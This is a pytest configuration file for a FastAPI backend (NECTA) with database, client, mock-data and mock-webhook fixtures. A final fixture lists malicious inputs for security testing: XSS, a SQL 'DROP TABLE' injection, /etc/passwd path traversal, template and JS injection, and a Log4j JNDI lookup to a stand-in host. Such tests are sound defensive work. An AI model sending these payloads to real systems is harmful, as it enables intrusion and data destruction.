"""
Test configuration and fixtures for NECTA backend tests.
"""
import asyncio
import os
import tempfile
from typing import AsyncGenerator, Generator

import pytest
import pytest_asyncio
from fastapi.testclient import TestClient
from httpx import AsyncClient
from sqlalchemy import create_engine
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.main import app

# Test database configuration
TEST_DATABASE_URL = "sqlite+aiosqlite:///:memory:"

# Create test engine
test_engine = create_async_engine(
    TEST_DATABASE_URL,
    poolclass=StaticPool,
    connect_args={
        "check_same_thread": False,
    },
    echo=False,
)

# Test session maker
TestSessionLocal = sessionmaker(
    test_engine, class_=AsyncSession, expire_on_commit=False
)


@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest_asyncio.fixture
async def db_session() -> AsyncGenerator[AsyncSession, None]:
    """Create a test database session."""
    from app.models import Base  # Import your models here when created
    
    # Create tables
    async with test_engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    
    # Create session
    async with TestSessionLocal() as session:
        yield session
    
    # Drop tables
    async with test_engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)


@pytest.fixture
def client() -> TestClient:
    """Create a test client for synchronous tests."""
    return TestClient(app)


@pytest_asyncio.fixture
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Create an async test client."""
    async with AsyncClient(app=app, base_url="http://test") as ac:
        yield ac


@pytest.fixture
def temp_file() -> Generator[str, None, None]:
    """Create a temporary file for testing."""
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        yield tmp.name
    os.unlink(tmp.name)


@pytest.fixture
def temp_dir() -> Generator[str, None, None]:
    """Create a temporary directory for testing."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        yield tmp_dir


@pytest.fixture
def mock_env_vars(monkeypatch) -> None:
    """Set up mock environment variables for testing."""
    test_env = {
        "SECRET_KEY": "test-secret-key-for-testing-only",
        "ENCRYPTION_KEY": "test-encryption-key-for-testing-only",
        "DATABASE_URL": TEST_DATABASE_URL,
        "DEBUG": "true",
        "APP_ENV": "testing",
        "LANGSMITH_API_KEY": "test-langsmith-key",
        "N8N_BASE_URL": "https://test-n8n.com",
        "WEBHOOK_TIMEOUT": "30",
        "WEBHOOK_MAX_RETRIES": "3",
        "WEBHOOK_RETRY_DELAY_SECONDS": "1",  # Faster for tests
    }
    
    for key, value in test_env.items():
        monkeypatch.setenv(key, value)


@pytest.fixture
def mock_user_data() -> dict:
    """Sample user data for testing."""
    return {
        "id": "test-user-id",
        "email": "test@example.com",
        "username": "testuser",
        "password_hash": "hashed-password",
        "is_active": True,
    }


@pytest.fixture
def mock_profile_data() -> dict:
    """Sample profile data for testing."""
    return {
        "id": "test-profile-id",
        "name": "Test Agent Profile",
        "description": "A test agent for development",
        "dev_webhook_url": "https://test-n8n.com/webhook/dev",
        "prod_webhook_url": "https://test-n8n.com/webhook/prod",
        "webhook_auth_type": "bearer",
        "webhook_auth_config": {"token": "test-token"},
        "environment": "dev",
        "is_active": True,
    }


@pytest.fixture
def mock_message_data() -> dict:
    """Sample message data for testing."""
    return {
        "id": "test-message-id",
        "profile_id": "test-profile-id",
        "message_type": "user",
        "content": "Hello, test agent!",
        "content_format": "markdown",
        "metadata": {"test": True},
        "file_attachments": [],
    }


@pytest.fixture
def mock_webhook_response() -> dict:
    """Sample webhook response for testing."""
    return {
        "status": "success",
        "message": "Hello from test agent!",
        "data": {"response_time": "0.5s"},
    }


class MockWebhookServer:
    """Mock webhook server for testing n8n integration."""
    
    def __init__(self):
        self.requests = []
        self.response = {"message": "Mock response"}
        self.status_code = 200
        self.delay = 0
    
    def set_response(self, response: dict, status_code: int = 200, delay: float = 0):
        self.response = response
        self.status_code = status_code
        self.delay = delay
    
    def get_requests(self) -> list:
        return self.requests.copy()
    
    def clear_requests(self):
        self.requests.clear()


@pytest.fixture
def mock_webhook_server() -> MockWebhookServer:
    """Create a mock webhook server for testing."""
    return MockWebhookServer()


# Security testing fixtures
@pytest.fixture
def invalid_jwt_token() -> str:
    """Invalid JWT token for testing."""
    return "invalid.jwt.token"


@pytest.fixture
def expired_jwt_token() -> str:
    """Expired JWT token for testing."""
    # This would be generated with past expiration time
    return "expired.jwt.token"


@pytest.fixture
def malicious_input_samples() -> list:
    """Sample malicious inputs for security testing."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://malicious.com/a}",  # Log4j injection
        "\\x00\\x01\\x02",  # Binary data
        "A" * 10000,  # Large input
        "{{constructor.constructor('return process')().exit()}}",  # JS injection
    ]